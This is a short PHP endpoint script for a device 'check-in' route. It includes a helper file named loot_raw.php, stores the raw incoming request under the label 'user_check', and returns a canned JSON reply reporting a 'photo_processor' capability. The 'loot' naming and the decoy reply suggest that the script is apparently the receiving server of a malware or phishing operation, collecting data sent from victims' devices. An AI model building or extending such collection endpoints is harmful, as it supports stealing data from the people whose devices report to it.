<?php
// POST /api/user/check —— 设备检查-in：原始落盘 + 应答
require_once '/www/wwwroot/i.131422.com/api/loot_raw.php';
loot_store('user_check');
loot_json_ok(array('photo_processor' => true));
